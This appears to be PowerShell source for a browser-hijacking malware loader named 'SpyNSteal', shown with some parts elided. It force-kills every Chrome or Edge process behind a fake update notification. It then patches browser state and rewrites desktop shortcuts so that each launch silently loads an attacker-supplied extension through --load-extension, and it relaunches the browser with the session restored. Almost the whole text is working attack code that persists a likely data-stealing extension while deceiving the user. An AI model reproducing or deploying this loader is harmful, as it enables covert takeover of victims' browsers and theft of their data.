# SpyNSteal - Extension Loader v4
# Writes extension, kills ALL Chrome processes, patches shortcuts dynamically,
# and relaunches with --load-extension.
...
function Find-Browser([string]$name) {
    ...
    switch ($name) {
        "chrome" {
            ...
            $info.ExeFilter = "chrome.exe"
            $info.LnkFilter = "*Chrome*"
        }
        "edge" {
...
function Kill-AllProcesses([string]$procName) {
    try { Stop-Process -Name $procName -Force -EA SilentlyContinue } catch {}
    Start-Sleep 2
    for ($i = 0; $i -lt 20; $i++) {
...
function Find-Shortcuts([string]$lnkFilter) {
    $results = @()
    $searchDirs = @(
    ...
    foreach ($dir in $searchDirs) {
        ...
        try {
            $found = Get-ChildItem $dir -Recurse -Filter "*.lnk" -EA SilentlyContinue |
                Where-Object { $_.Name -like $lnkFilter }
...
# 3 - Show notification then force-kill ALL browser processes
if ($wasRunning.Count -gt 0) {
    Show-UpdateNotif $wasRunning[0]

    foreach ($b in $wasRunning) {
        Log "Force-killing ALL $($b.Proc) processes..."
        $dead = Kill-AllProcesses $b.Proc
        Log "$($b.Proc) fully dead: $dead"
    }
}

# Patch Local State for clean restart
foreach ($b in $wasRunning) { Patch-LocalState $b.UserData }

# 4 - Find and patch shortcuts dynamically
foreach ($b in $browsers) {
    $shortcuts = Find-Shortcuts $b.LnkFilter
    Log "Found $($shortcuts.Count) shortcuts for $($b.Name): $($shortcuts -join '; ')"
    foreach ($s in $shortcuts) {
        $ok = Patch-Shortcut $s $extDir
        Log "  Patch '$s': $ok"
    }
}

# 5 - Verify no browser processes remain before relaunch
foreach ($b in $wasRunning) {
    $still = [bool](Get-Process $b.Proc -EA SilentlyContinue)
    if ($still) {
        Log "WARNING: $($b.Proc) still alive, force-killing again..."
        Kill-AllProcesses $b.Proc | Out-Null
    }
}

# 6 - Relaunch with --load-extension (using ArgumentList array)
Start-Sleep 1
foreach ($b in $wasRunning) {
    if ($b.ExePath -and (Test-Path $b.ExePath)) {
        $launchArgs = @("--restore-last-session", "--load-extension=`"$extDir`"")
        Log "Launching: $($b.ExePath) $($launchArgs -join ' ')"
        try {
            Start-Process -FilePath $b.ExePath -ArgumentList $launchArgs
        } catch {
            Log "Launch error: $_"
        }
    }
